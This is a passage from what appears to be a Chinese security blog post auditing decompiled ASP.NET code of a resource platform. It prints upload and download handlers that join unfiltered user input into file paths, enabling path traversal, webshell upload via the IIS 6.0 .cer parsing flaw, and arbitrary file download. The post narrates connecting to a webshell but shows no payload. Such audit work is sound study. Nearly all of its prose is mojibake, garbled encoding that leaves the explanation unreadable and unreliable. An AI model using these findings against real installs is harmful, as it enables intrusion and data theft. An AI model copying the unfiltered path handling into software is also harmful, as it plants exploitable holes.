<li>å¯¼å…¥System.Web å‘½åç©ºé—´ï¼Œè¯¥å‘½åç©ºé—´åŒ…å«äº†ä¸Webå¼€å‘ç›¸å…³çš„ç±»å’ŒåŠŸèƒ½ã€‚åœ¨è¿™é‡Œï¼Œä¸»è¦ç”¨äºå¤„ç†Webè¯·æ±‚å’Œç›¸å…³çš„æ“ä½œï¼Œå¦‚ HttpPostedFile ã€‚</li>
</ul>
</li>
<li>using System.Web.UI;ï¼š<ul>
<li>å¯¼å…¥ System.Web.UI å‘½åç©ºé—´ï¼Œè¯¥å‘½åç©ºé—´åŒ…å«äº†ä¸Webç”¨æˆ·ç•Œé¢ï¼ˆUIï¼‰å¼€å‘ç›¸å…³çš„ç±»å’ŒåŠŸèƒ½ã€‚åœ¨è¿™é‡Œï¼Œä¸»è¦ç”¨äºå¤„ç†Webé¡µé¢å’Œæ§ä»¶çš„å¼€å‘ï¼Œæ¯”å¦‚ Page ç±»ã€‚</li>
</ul>
</li>
</ol>
<p>æœ‰äº† using System.IO; è¯­å¥ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ Directory ã€ File ç­‰ç±»ï¼Œè€Œä¸éœ€è¦å†™æˆ System.IO.Directory ã€ System.IO.Fileã€‚è¿™å››ä¸ªåº“æ˜¯.NET Frameworkçš„ä¸€éƒ¨åˆ†ï¼Œå±äºæ˜¯è‡ªå¸¦çš„ï¼ˆ.NET Frameworkæ˜¯ç”±Microsoftå¼€å‘çš„ä¸€ä¸ªé¢å‘Windowsæ“ä½œç³»ç»Ÿçš„è½¯ä»¶å¼€å‘æ¡†æ¶ï¼ŒåŒ…å«äº†å¤§é‡çš„ç±»åº“å’Œè¿è¡Œæ—¶ç¯å¢ƒï¼Œç”¨äºæ”¯æŒå’Œç®€åŒ–Windowsåº”ç”¨ç¨‹åºå’ŒWebåº”ç”¨ç¨‹åºçš„å¼€å‘ã€‚è¿™ä¸ªæ¡†æ¶åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­æ˜¯é»˜è®¤å®‰è£…çš„ã€‚ï¼‰</p>
<p>ç„¶åä½¿ç”¨äº† Page_Load æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯å½“é¡µé¢è¢«åŠ è½½æ—¶è§¦å‘çš„äº‹ä»¶ï¼Œè¯¥æ–¹æ³•å…ˆä½¿ç”¨</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å»åˆ¤æ–­æ˜¯å¦æœ‰æ–‡ä»¶è¢«ä¸Šä¼ ï¼Œå¦‚æœæ²¡æœ‰æ–‡ä»¶ä¸Šä¼ åˆ™ç›´æ¥è¿”å›</p>
<p>å½“æœ‰æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå¤„ç†</p>
<p>è·å–ç¬¬ä¸€ä¸ªä¸Šä¼ çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpPostedFile httpPostedFile = <span class="keyword">base</span>.Request.Files[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šä¼ çš„æ–‡ä»¶ä¸­è·å–æ–‡ä»¶åï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> fileName = httpPostedFile.FileName;</span><br></pre></td></tr></table></figure>

<p>ä»æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­è·å–åä¸º â€œVideoGuidâ€ çš„å‚æ•°ï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> text = <span class="keyword">base</span>.Request.QueryString[<span class="string">&quot;VideoGuid&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œç›®å½•æ‹¼æ¥ï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±åˆ›å»ºä¸€ä¸ª</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~/Upload/Video/&quot;</span> + text + <span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!Directory.Exists(text2))</span><br><span class="line">&#123;</span><br><span class="line">    Directory.CreateDirectory(text2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åé€šè¿‡ text2 ä¸Filenameè¿›è¡Œæ‹¼æ¥æˆæ–‡ä»¶è·¯å¾„ä¿å­˜ï¼ŒæˆåŠŸè¿”å›Success</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text2 += httpPostedFile.FileName;</span><br><span class="line">httpPostedFile.SaveAs(text2);</span><br><span class="line"><span class="keyword">base</span>.Response.Clear();</span><br><span class="line"><span class="keyword">base</span>.Response.Write(<span class="string">&quot;Success&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="http://oss.hehanzzz.icu/img/202405061250717.png"></p>
<p>åˆ°è¿™é‡Œä¹Ÿç®—ç®€å•åˆ†æäº†ä¸€æ¬¡ï¼Œä¸æåç»­å¦‚ä½•åˆ©ç”¨</p>
<p>è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆè¦è·¨ç›®å½•è¿›è¡Œä¸Šä¼ ï¼Œä¸èƒ½ç›´æ¥ä¸Šä¼ ï¼Œæ˜¯å› ä¸ºï¼Œè¿™å¥—ç³»ç»Ÿçš„ç›®å½•ç»“æ„æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.WebUI</span><br><span class="line">xxx.AdminUI	/æˆ‘ä»¬è¿™æ¬¡åˆ†æçš„dllåœ¨è¿™ä¸ªç›®å½•ä¸‹</span><br></pre></td></tr></table></figure>

<p>è¦ä¸Šä¼ åˆ°å‰ç«¯å¾—éœ€è¦è·¨ç›®å½•ç©¿</p>
<p>æ‰€ä»¥æ€»ç»“ä¸€ä¸‹æ¼æ´æˆå› æ˜¯å› ä¸ºï¼Œæ–‡ä»¶ä¸Šä¼ æœªä½œé™åˆ¶ï¼Œæ–‡ä»¶Filenameè¿›è¡Œæ‹¼æ¥çš„æ—¶å€™æœªä½œè¿‡æ»¤ï¼Œå¯¼è‡´è¿è¡Œ..&#x2F;å­˜åœ¨è¿›è¡Œè·¨ç›®å½•ç©¿ğŸ</p>
<h1 id="0x03-å‰å°ä¸Šä¼ å®¡è®¡"><a href="#0x03-å‰å°ä¸Šä¼ å®¡è®¡" class="headerlink" title="0x03 å‰å°ä¸Šä¼ å®¡è®¡"></a>0x03 å‰å°ä¸Šä¼ å®¡è®¡</h1><p>å°†æ‰€æœ‰çš„dllé€šè¿‡ILSpyåç¼–è¯‘åå¦å­˜è¿™äº›csï¼Œæ–‡ä»¶ä¸Šä¼ çš„å®¡è®¡æ–¹æ³•æ˜¯é€šè¿‡æœç´¢å…³é”®è¯è¿›è¡Œå¿«é€Ÿå®šä½ï¼Œé—®äº†ä¸€ä¸‹aä½¬å®¡è®¡çš„æ—¶å€™çœ‹å“ªäº›å…³é”®è¯ï¼Œaä½¬é©¬ä¸Šä¸¢ä¸¤ä¸ªå¸¸ç”¨çš„æ–‡ä»¶ä¸Šä¼ å…³é”®è¯ streamWriter.Write å’Œ SaveAs</p>
<p>äºæ˜¯ç›´æ¥å¿«é€Ÿå®šä½äº†ä¸€ä¸ª <em>AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile</em></p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250070.png"></p>
<p>é€šè¿‡é€†å‘æœç´¢çœ‹çœ‹è°å¼•ç”¨ <em>AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile</em> </p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ &#x2F;Services&#x2F;Convert&#x2F;UploadFile.aspx</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250070.png"></p>
<p>ç®€å•åˆ†æä¸€ä¸‹</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AVA.ResourcesPlatform.AdminUI, Version=20.17.5.30, Culture=neutral, PublicKeyToken=null</span></span><br><span class="line"><span class="comment">// AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UploadFile</span> : <span class="title">Page</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			HttpPostedFile httpPostedFile = <span class="keyword">base</span>.Request.Files[<span class="number">0</span>];</span><br><span class="line">			<span class="built_in">string</span> fileName = httpPostedFile.FileName;</span><br><span class="line">			<span class="built_in">string</span> text = <span class="keyword">base</span>.Request.QueryString[<span class="string">&quot;VideoGuid&quot;</span>];</span><br><span class="line">			<span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~/Upload/Video/&quot;</span> + text + <span class="string">&quot;/&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (!Directory.Exists(text2))</span><br><span class="line">			&#123;</span><br><span class="line">				Directory.CreateDirectory(text2);</span><br><span class="line">			&#125;</span><br><span class="line">			text2 += httpPostedFile.FileName;</span><br><span class="line">			httpPostedFile.SaveAs(text2);</span><br><span class="line">			<span class="keyword">base</span>.Response.Clear();</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">base</span>.Response.Clear();</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(ex.Message);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç å’Œå‰é¢çš„Pocæ˜¯ä¸€æ ·çš„ï¼Œä¿å­˜çš„æ—¶å€™ä¼šé¡ºå¸¦åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250813.png"></p>
<p>ä½†æ˜¯åœ¨åˆ©ç”¨çš„æ—¶å€™å‘ç°ä¸Šä¼ aspxå¤±è´¥ï¼Œæ¢åç¼€aspã€cerä¼šå‡ºç°403ï¼Œäºæ˜¯åˆ©ç”¨åˆ›å»ºæ–‡ä»¶å¤¹çš„ç‰¹æ€§ï¼Œå»åˆ›æ–‡ä»¶å¤¹ç©¿ğŸ</p>
<p>è¿™æ—¶å€™è®¿é—®æ˜¾ç¤º500</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250693.png"></p>
<p>èšå‰‘å´å¯è¿æ¥æˆåŠŸâ€¦ä¸æ”¾å›¾äº†</p>
<p>è¿™é‡Œä¹Ÿæ˜¯ç–‘æƒ‘äº†ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆä¼ cerä¹Ÿå¯ä»¥è¢«è§£æ</p>
<p>ç™¾åº¦ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ IIS6.0æ–‡ä»¶è§£æç¼ºé™·(asa,cer,cdx)</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒIISå¯¹å…¶åç¼€åæ˜ å°„åˆ°äº†asp.dllï¼Œasp.dllåˆæ˜¯ASPè„šæœ¬çš„è§£ææ–‡ä»¶ï¼Œæ‰€ä»¥èƒ½å¤Ÿæ­£å¸¸è§£æ</p>
<p>åé¢åˆç”¨åŒæ ·çš„æ–¹æ³•å»æ‰¾äº†äº”ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¹Ÿæ˜¯æˆåŠŸå¤ç°äº†ä¸¤ä¸ª</p>
<p>å› ä¸ºä»£ç åŸç†ä¸€æ ·å°±ä¸é‡å¤ä¸¾ä¾‹äº†</p>
<h1 id="0x04-å‰å°æ–‡ä»¶ä¸‹è½½"><a href="#0x04-å‰å°æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x04 å‰å°æ–‡ä»¶ä¸‹è½½"></a>0x04 å‰å°æ–‡ä»¶ä¸‹è½½</h1><p>å®¡è®¡ä»»æ„æ–‡ä»¶ä¸‹è½½æœ‰ä¸ªå…³é”®å‡½æ•°æ˜¯ Response.BinaryWrite ç›´æ¥å…¨å±€æœ</p>
<p>å‘ç° AVA.ResourcesPlatform.WebUI.Download ä¸‹æœ‰è¿™ä¸ªå‡½æ•°</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250308.png"></p>
<p>æŠŠä»£ç è„±ä¸‹æ¥åˆ†æä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¿‡æ»¤</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AVA.ResourcesPlatform.WebUI, Version=20.17.5.30, Culture=neutral, PublicKeyToken=null</span></span><br><span class="line"><span class="comment">// AVA.ResourcesPlatform.WebUI.Download</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> AVA.ResourcesPlatform.Config;</span><br><span class="line"><span class="keyword">using</span> AVA.ResourcesPlatform.Factory;</span><br><span class="line"><span class="keyword">using</span> AVA.ResourcesPlatform.Language;</span><br><span class="line"><span class="keyword">using</span> AVA.ResourcesPlatform.Model.Pub;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Download</span> : <span class="title">Page</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">string</span> text = <span class="keyword">base</span>.Request.GetFormValue(<span class="string">&quot;File&quot;</span>).UrlDecode();</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(text))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> Exception(LanguageEnum.æœªæŒ‡æ˜ä¸‹è½½æ–‡ä»¶.Define());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~&quot;</span> + text);</span><br><span class="line">		<span class="keyword">if</span> (!File.Exists(text2))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> Exception(LanguageEnum.æ–‡ä»¶ä¸å­˜åœ¨.Define());</span><br><span class="line">		&#125;</span><br><span class="line">		FileInfo fileInfo = <span class="keyword">new</span> FileInfo(text2);</span><br><span class="line">		Domain domain = CreateInstance.DomainDao.Get(CookieGroupConfig.DomainGuid);</span><br><span class="line">		<span class="keyword">if</span> (!ResponseFile(Page.Request, Page.Response, fileInfo.Name, fileInfo.FullName, domain.DownloadSpeed * <span class="number">1024</span> * <span class="number">1024</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(LanguageEnum.ä¸‹è½½æ–‡ä»¶å‡ºé”™.Define());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			Page.Response.End();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ResponseFile</span>(<span class="params">HttpRequest hRequest, HttpResponse hResponse, <span class="built_in">string</span> hfileName, <span class="built_in">string</span> hfullPath, <span class="built_in">long</span> hspeed</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			Page.Response.Clear();</span><br><span class="line">			FileStream fileStream = <span class="keyword">new</span> FileStream(hfullPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);</span><br><span class="line">			BinaryReader binaryReader = <span class="keyword">new</span> BinaryReader(fileStream);</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				hResponse.AddHeader(<span class="string">&quot;Accept-Ranges&quot;</span>, <span class="string">&quot;bytes&quot;</span>);</span><br><span class="line">				hResponse.Buffer = <span class="literal">false</span>;</span><br><span class="line">				<span class="built_in">long</span> length = fileStream.Length;</span><br><span class="line">				<span class="built_in">long</span> num = <span class="number">0L</span>;</span><br><span class="line">				<span class="built_in">int</span> num2 = <span class="number">102400</span>;</span><br><span class="line">				<span class="built_in">int</span> millisecondsTimeout = (<span class="built_in">int</span>)Math.Floor(<span class="number">1000.0</span> * (<span class="built_in">double</span>)num2 / (<span class="built_in">double</span>)hspeed) + <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> (hRequest.Headers[<span class="string">&quot;Range&quot;</span>] != <span class="literal">null</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					hResponse.StatusCode = <span class="number">206</span>;</span><br><span class="line">					<span class="built_in">string</span>[] array = hRequest.Headers[<span class="string">&quot;Range&quot;</span>].Split(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">					num = Convert.ToInt64(array[<span class="number">1</span>]);</span><br><span class="line">				&#125;</span><br><span class="line">				hResponse.AddHeader(<span class="string">&quot;Content-Length&quot;</span>, (length - num).ToString());</span><br><span class="line">				<span class="keyword">if</span> (num != <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					hResponse.AddHeader(<span class="string">&quot;Content-Range&quot;</span>, <span class="string">$&quot; bytes <span class="subst">&#123;num&#125;</span>-<span class="subst">&#123;length - <span class="number">1</span>&#125;</span>/<span class="subst">&#123;length&#125;</span>&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				hResponse.AddHeader(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;Keep-Alive&quot;</span>);</span><br><span class="line">				<span class="built_in">string</span> text = <span class="literal">null</span>;</span><br><span class="line">				<span class="built_in">string</span> text2 = Context.Request.UserAgent.ToUpper();</span><br><span class="line">				text = ((text2.Contains(<span class="string">&quot;MS&quot;</span>) &amp;&amp; text2.Contains(<span class="string">&quot;IE&quot;</span>)) ? HttpUtility.UrlEncode(hfileName) : ((!text2.Contains(<span class="string">&quot;FIREFOX&quot;</span>)) ? HttpUtility.UrlEncode(hfileName) : (<span class="string">&quot;\&quot;&quot;</span> + hfileName + <span class="string">&quot;\&quot;&quot;</span>)));</span><br><span class="line">				<span class="keyword">base</span>.Response.ContentType = <span class="string">&quot;application/octet-stream &quot;</span>;</span><br><span class="line">				<span class="keyword">base</span>.Response.AddHeader(<span class="string">&quot;Content-Disposition &quot;</span>, <span class="string">$&quot;attachment;filename=<span class="subst">&#123;text&#125;</span>&quot;</span>);</span><br><span class="line">				binaryReader.BaseStream.Seek(num, SeekOrigin.Begin);</span><br><span class="line">				<span class="built_in">int</span> num3 = (<span class="built_in">int</span>)Math.Floor(Convert.ToDouble((length - num) / num2)) + <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; num3; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (hResponse.IsClientConnected)</span><br><span class="line">					&#123;</span><br><span class="line">						hResponse.BinaryWrite(binaryReader.ReadBytes(num2));</span><br><span class="line">						Thread.Sleep(millisecondsTimeout);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						i = num3;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">finally</span></span><br><span class="line">			&#123;</span><br><span class="line">				binaryReader.Close();</span><br><span class="line">				fileStream.Close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¼€å±€å…ˆç”¨ Page_Load æ–¹æ³•å»è·å–å‚æ•° File ä¸­çš„å€¼ï¼Œå¹¶ä¸”å¯¹å…¶URLè§£ç ï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> text = <span class="keyword">base</span>.Request.GetFormValue(<span class="string">&quot;File&quot;</span>).UrlDecode();</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ£€æµ‹æ˜¯å¦è·å–æ–‡ä»¶åï¼Œæ²¡æœ‰å°±æŠ›å‡ºå¼‚å¸¸ï¼Œç„¶åç”¨ text2 å°†è™šæ‹Ÿè·¯å¾„è½¬åŒ–ä¸ºç‰©ç†è·¯å¾„ï¼Œå»æ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åŒæ ·æŠ›å‡ºå¼‚å¸¸ï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(text))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(LanguageEnum.æœªæŒ‡æ˜ä¸‹è½½æ–‡ä»¶.Define());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~&quot;</span> + text);</span><br><span class="line"><span class="keyword">if</span> (!File.Exists(text2))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(LanguageEnum.æ–‡ä»¶ä¸å­˜åœ¨.Define());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·å–æ–‡ä»¶ä¿¡æ¯ä»¥åŠåŸŸä¿¡æ¯ï¼š</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FileInfo fileInfo = <span class="keyword">new</span> FileInfo(text2);</span><br><span class="line">Domain domain = CreateInstance.DomainDao.Get(CookieGroupConfig.DomainGuid);</span><br></pre></td></tr></table></figure>

<p>æ¥ç€è°ƒç”¨ ResponseFile æ–¹æ³•å»ä¸‹è½½æ–‡ä»¶äº†</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ResponseFile(Page.Request, Page.Response, fileInfo.Name, fileInfo.FullName, domain.DownloadSpeed * <span class="number">1024</span> * <span class="number">1024</span>))</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾å•Šï¼Œè¿™é‡Œå¯¹ä¼ å…¥çš„ File æ²¡åšä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥å°±å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½äº†</p>
<p>è¿™é‡Œçš„ ResponseFile ä¹Ÿæ˜¯å¸¸è§„çš„æ–‡ä»¶ä¸‹è½½æ–¹æ³•ï¼Œè¿™é‡Œä¸åšåˆ†æ</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061250630.png"> </p>
<h1 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05 å°ç»“"></a>0x05 å°ç»“</h1><p>è¿™å¥—æºç è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå‡ ä¹æ²¡åšä»»ä½•è¿‡æ»¤ï¼Œä¸»è¦å…¥é—¨è¿˜æ˜¯å¾—å»äº†è§£åç¼–è¯‘å·¥å…·ã€æ§åˆ¶å™¨åœ¨å“ªå’Œå…³é”®å‡½æ•°å®šä½äº†</p>
